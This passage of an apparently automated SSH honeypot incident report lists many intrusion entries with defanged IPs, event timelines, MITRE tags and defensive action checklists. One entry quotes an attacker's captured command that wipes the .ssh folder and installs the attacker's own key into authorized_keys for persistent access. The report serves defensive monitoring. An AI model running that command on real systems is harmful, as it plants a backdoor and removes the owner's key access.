| `2026-08-20 11:23:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.235.16[.]111` to AbuseIPDB if not already reported
- [ ] Block `83.235.16[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71164867a75e

| Field | Detail |
|---|---|
| **Source IP** | `83.235.16[.]111` |
| **First Seen** | 2026-08-20 11:23 |
| **Last Seen** | 2026-08-20 11:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:23:23` | `cowrie.session.connect` |
| `2026-08-20 11:23:23` | `cowrie.client.version` |
| `2026-08-20 11:23:23` | `cowrie.client.kex` |
| `2026-08-20 11:23:24` | `cowrie.login.success` |
| `2026-08-20 11:23:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.235.16[.]111` to AbuseIPDB if not already reported
- [ ] Block `83.235.16[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00e05c2da1c5

| Field | Detail |
|---|---|
| **Source IP** | `83.235.16[.]111` |
| **First Seen** | 2026-08-20 11:23 |
| **Last Seen** | 2026-08-20 11:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:23:24` | `cowrie.session.connect` |
| `2026-08-20 11:23:24` | `cowrie.client.version` |
| `2026-08-20 11:23:24` | `cowrie.client.kex` |
| `2026-08-20 11:23:25` | `cowrie.login.success` |
| `2026-08-20 11:23:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.235.16[.]111` to AbuseIPDB if not already reported
- [ ] Block `83.235.16[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0f027583d45

| Field | Detail |
|---|---|
| **Source IP** | `117.216.33[.]31` |
| **First Seen** | 2026-08-20 11:27 |
| **Last Seen** | 2026-08-20 11:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:27:28` | `cowrie.session.connect` |
| `2026-08-20 11:27:29` | `cowrie.client.version` |
| `2026-08-20 11:27:29` | `cowrie.client.kex` |
| `2026-08-20 11:27:31` | `cowrie.login.success` |
| `2026-08-20 11:27:31` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:27:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.216.33[.]31` to AbuseIPDB if not already reported
- [ ] Block `117.216.33[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cde0eb5966a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 11:28 |
| **Last Seen** | 2026-08-20 11:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:28:19` | `cowrie.session.connect` |
| `2026-08-20 11:28:19` | `cowrie.client.version` |
| `2026-08-20 11:28:20` | `cowrie.client.kex` |
| `2026-08-20 11:28:21` | `cowrie.login.success` |
| `2026-08-20 11:28:22` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:28:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 11:28:24` | `cowrie.direct-tcpip.data` |
| `2026-08-20 11:28:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2477dc2c4be0

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-08-20 11:31 |
| **Last Seen** | 2026-08-20 11:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:31:29` | `cowrie.session.connect` |
| `2026-08-20 11:31:30` | `cowrie.client.version` |
| `2026-08-20 11:31:30` | `cowrie.client.kex` |
| `2026-08-20 11:31:33` | `cowrie.login.success` |
| `2026-08-20 11:31:34` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:31:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31ec12435c27

| Field | Detail |
|---|---|
| **Source IP** | `182.53.52[.]68` |
| **First Seen** | 2026-08-20 11:31 |
| **Last Seen** | 2026-08-20 11:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:31:39` | `cowrie.session.connect` |
| `2026-08-20 11:31:40` | `cowrie.client.version` |
| `2026-08-20 11:31:40` | `cowrie.client.kex` |
| `2026-08-20 11:31:43` | `cowrie.login.success` |
| `2026-08-20 11:31:43` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:31:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.53.52[.]68` to AbuseIPDB if not already reported
- [ ] Block `182.53.52[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0443637a6b9

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]188` |
| **First Seen** | 2026-08-20 11:31 |
| **Last Seen** | 2026-08-20 11:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:31:43` | `cowrie.session.connect` |
| `2026-08-20 11:31:44` | `cowrie.client.version` |
| `2026-08-20 11:31:44` | `cowrie.client.kex` |
| `2026-08-20 11:31:45` | `cowrie.login.success` |
| `2026-08-20 11:31:46` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:31:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]188` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]188` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b5556e16ed6

| Field | Detail |
|---|---|
| **Source IP** | `85.105.2[.]51` |
| **First Seen** | 2026-08-20 11:31 |
| **Last Seen** | 2026-08-20 11:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:31:51` | `cowrie.session.connect` |
| `2026-08-20 11:31:51` | `cowrie.client.version` |
| `2026-08-20 11:31:51` | `cowrie.client.kex` |
| `2026-08-20 11:31:52` | `cowrie.login.success` |
| `2026-08-20 11:31:53` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:31:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.105.2[.]51` to AbuseIPDB if not already reported
- [ ] Block `85.105.2[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c1adf800f2a

| Field | Detail |
|---|---|
| **Source IP** | `182.118.64[.]225` |
| **First Seen** | 2026-08-20 11:33 |
| **Last Seen** | 2026-08-20 11:37 |
| **Session Duration** | 249s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:33:38` | `cowrie.session.connect` |
| `2026-08-20 11:33:38` | `cowrie.client.version` |
| `2026-08-20 11:33:39` | `cowrie.client.kex` |
| `2026-08-20 11:33:40` | `cowrie.login.success` |
| `2026-08-20 11:33:41` | `cowrie.session.params` |
| `2026-08-20 11:33:41` | `cowrie.command.input` |
| `2026-08-20 11:33:41` | `cowrie.command.failed` |
| `2026-08-20 11:33:41` | `cowrie.log.closed` |
| `2026-08-20 11:33:42` | `cowrie.session.params` |
| `2026-08-20 11:33:42` | `cowrie.command.input` |
| `2026-08-20 11:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.118.64[.]225` to AbuseIPDB if not already reported
- [ ] Block `182.118.64[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71820934bf3a

| Field | Detail |
|---|---|
| **Source IP** | `182.118.64[.]225` |
| **First Seen** | 2026-08-20 11:33 |
| **Last Seen** | 2026-08-20 11:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:33:42` | `cowrie.session.connect` |
| `2026-08-20 11:33:42` | `cowrie.client.version` |
| `2026-08-20 11:33:43` | `cowrie.client.kex` |
| `2026-08-20 11:33:44` | `cowrie.login.success` |
| `2026-08-20 11:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.118.64[.]225` to AbuseIPDB if not already reported
- [ ] Block `182.118.64[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38d9ff561e0f

| Field | Detail |
|---|---|
| **Source IP** | `182.118.64[.]225` |
| **First Seen** | 2026-08-20 11:33 |
| **Last Seen** | 2026-08-20 11:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:33:44` | `cowrie.session.connect` |
| `2026-08-20 11:33:44` | `cowrie.client.version` |
| `2026-08-20 11:33:44` | `cowrie.client.kex` |
| `2026-08-20 11:33:45` | `cowrie.login.success` |
| `2026-08-20 11:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.118.64[.]225` to AbuseIPDB if not already reported
- [ ] Block `182.118.64[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83863d693650

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 11:33 |
| **Last Seen** | 2026-08-20 11:39 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:33:56` | `cowrie.session.connect` |
| `2026-08-20 11:33:56` | `cowrie.client.version` |
| `2026-08-20 11:33:57` | `cowrie.client.kex` |
| `2026-08-20 11:34:00` | `cowrie.login.success` |
| `2026-08-20 11:34:00` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f55312b12daf

| Field | Detail |
|---|---|
| **Source IP** | `120.234.232[.]184` |
| **First Seen** | 2026-08-20 11:34 |
| **Last Seen** | 2026-08-20 11:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:34:06` | `cowrie.session.connect` |
| `2026-08-20 11:34:07` | `cowrie.client.version` |
| `2026-08-20 11:34:07` | `cowrie.client.kex` |
| `2026-08-20 11:34:09` | `cowrie.login.success` |
| `2026-08-20 11:34:10` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:34:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.234.232[.]184` to AbuseIPDB if not already reported
- [ ] Block `120.234.232[.]184` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-614339344bf9

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]128` |
| **First Seen** | 2026-08-20 11:34 |
| **Last Seen** | 2026-08-20 11:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:34:16` | `cowrie.session.connect` |
| `2026-08-20 11:34:16` | `cowrie.client.version` |
| `2026-08-20 11:34:16` | `cowrie.client.kex` |
| `2026-08-20 11:34:19` | `cowrie.login.success` |
| `2026-08-20 11:34:19` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:34:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]128` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]128` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33e9ef5164ea

| Field | Detail |
|---|---|
| **Source IP** | `45.79.207[.]71` |
| **First Seen** | 2026-08-20 11:35 |
| **Last Seen** | 2026-08-20 11:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept: */*, Accept-Encoding: gzip, User-Agent: Mozilla/5.0 zgrab/0.x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:35:27` | `cowrie.session.connect` |
| `2026-08-20 11:35:27` | `cowrie.login.success` |
| `2026-08-20 11:35:28` | `cowrie.session.params` |
| `2026-08-20 11:35:28` | `cowrie.command.input` |
| `2026-08-20 11:35:28` | `cowrie.command.failed` |
| `2026-08-20 11:35:28` | `cowrie.command.input` |
| `2026-08-20 11:35:28` | `cowrie.command.failed` |
| `2026-08-20 11:35:28` | `cowrie.command.input` |
| `2026-08-20 11:35:28` | `cowrie.command.failed` |
| `2026-08-20 11:35:28` | `cowrie.command.input` |
| `2026-08-20 11:35:28` | `cowrie.log.closed` |
| `2026-08-20 11:35:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.207[.]71` to AbuseIPDB if not already reported
- [ ] Block `45.79.207[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dcf4551d675

| Field | Detail |
|---|---|
| **Source IP** | `172.234.217[.]129` |
| **First Seen** | 2026-08-20 11:36 |
| **Last Seen** | 2026-08-20 11:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:36:32` | `cowrie.session.connect` |
| `2026-08-20 11:36:32` | `cowrie.login.success` |
| `2026-08-20 11:36:33` | `cowrie.session.params` |
| `2026-08-20 11:36:33` | `cowrie.command.input` |
| `2026-08-20 11:36:33` | `cowrie.command.input` |
| `2026-08-20 11:36:33` | `cowrie.command.failed` |
| `2026-08-20 11:36:33` | `cowrie.command.input` |
| `2026-08-20 11:36:33` | `cowrie.command.failed` |
| `2026-08-20 11:36:33` | `cowrie.command.input` |
| `2026-08-20 11:36:33` | `cowrie.log.closed` |
| `2026-08-20 11:36:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.234.217[.]129` to AbuseIPDB if not already reported
- [ ] Block `172.234.217[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-261f315c578b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 11:39 |
| **Last Seen** | 2026-08-20 11:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:39:37` | `cowrie.session.connect` |
| `2026-08-20 11:39:38` | `cowrie.client.version` |
| `2026-08-20 11:39:38` | `cowrie.client.kex` |
| `2026-08-20 11:39:39` | `cowrie.login.success` |
| `2026-08-20 11:39:40` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:39:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 11:39:41` | `cowrie.direct-tcpip.data` |
| `2026-08-20 11:39:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-160e18adc672

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 11:44 |
| **Last Seen** | 2026-08-20 11:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:44:50` | `cowrie.session.connect` |
| `2026-08-20 11:44:51` | `cowrie.client.version` |
| `2026-08-20 11:44:51` | `cowrie.client.kex` |
| `2026-08-20 11:44:52` | `cowrie.login.success` |
| `2026-08-20 11:44:52` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:44:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 11:44:53` | `cowrie.direct-tcpip.data` |
| `2026-08-20 11:44:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c863d0266002

| Field | Detail |
|---|---|
| **Source IP** | `61.2.44[.]54` |
| **First Seen** | 2026-08-20 11:50 |
| **Last Seen** | 2026-08-20 11:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:50:05` | `cowrie.session.connect` |
| `2026-08-20 11:50:05` | `cowrie.client.version` |
| `2026-08-20 11:50:05` | `cowrie.client.kex` |
| `2026-08-20 11:50:07` | `cowrie.login.success` |
| `2026-08-20 11:50:08` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:50:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.2.44[.]54` to AbuseIPDB if not already reported
- [ ] Block `61.2.44[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfc71977f6f2

| Field | Detail |
|---|---|
| **Source IP** | `95.79.108[.]51` |
| **First Seen** | 2026-08-20 11:50 |
| **Last Seen** | 2026-08-20 11:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:50:13` | `cowrie.session.connect` |
| `2026-08-20 11:50:14` | `cowrie.client.version` |
| `2026-08-20 11:50:14` | `cowrie.client.kex` |
| `2026-08-20 11:50:15` | `cowrie.login.success` |
| `2026-08-20 11:50:15` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:50:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.79.108[.]51` to AbuseIPDB if not already reported
- [ ] Block `95.79.108[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de90329413dd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 11:50 |
| **Last Seen** | 2026-08-20 11:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:50:47` | `cowrie.session.connect` |
| `2026-08-20 11:50:47` | `cowrie.client.version` |
| `2026-08-20 11:50:47` | `cowrie.client.kex` |
| `2026-08-20 11:50:48` | `cowrie.login.success` |
| `2026-08-20 11:50:48` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:50:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 11:50:49` | `cowrie.direct-tcpip.data` |
| `2026-08-20 11:50:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-614b29875587

| Field | Detail |
|---|---|
| **Source IP** | `121.178.185[.]141` |
| **First Seen** | 2026-08-20 11:55 |
| **Last Seen** | 2026-08-20 11:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:55:46` | `cowrie.session.connect` |
| `2026-08-20 11:55:47` | `cowrie.client.version` |
| `2026-08-20 11:55:47` | `cowrie.client.kex` |
| `2026-08-20 11:55:50` | `cowrie.login.success` |
| `2026-08-20 11:55:51` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:55:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.178.185[.]141` to AbuseIPDB if not already reported
- [ ] Block `121.178.185[.]141` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-833d063da108

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 11:55 |
| **Last Seen** | 2026-08-20 11:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:55:47` | `cowrie.session.connect` |
| `2026-08-20 11:55:49` | `cowrie.client.version` |
| `2026-08-20 11:55:49` | `cowrie.client.kex` |
| `2026-08-20 11:55:51` | `cowrie.login.success` |
| `2026-08-20 11:55:51` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:55:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 11:55:51` | `cowrie.direct-tcpip.data` |
| `2026-08-20 11:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6764c911d9b

| Field | Detail |
|---|---|
| **Source IP** | `117.250.250[.]2` |
| **First Seen** | 2026-08-20 11:55 |
| **Last Seen** | 2026-08-20 11:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:55:56` | `cowrie.session.connect` |
| `2026-08-20 11:55:57` | `cowrie.client.version` |
| `2026-08-20 11:55:57` | `cowrie.client.kex` |
| `2026-08-20 11:55:59` | `cowrie.login.success` |
| `2026-08-20 11:56:00` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:56:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.250.250[.]2` to AbuseIPDB if not already reported
- [ ] Block `117.250.250[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e803c0320275

| Field | Detail |
|---|---|
